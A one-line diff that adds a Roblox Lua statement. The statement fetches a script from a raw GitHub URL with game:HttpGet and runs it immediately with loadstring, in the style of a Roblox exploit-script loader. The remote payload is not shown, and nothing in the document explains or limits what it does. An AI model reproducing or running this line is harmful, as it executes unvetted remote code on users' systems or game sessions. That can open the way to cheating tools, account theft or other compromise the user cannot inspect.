@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/c13248eef17a78ade449/STEF/main/Script", true))()
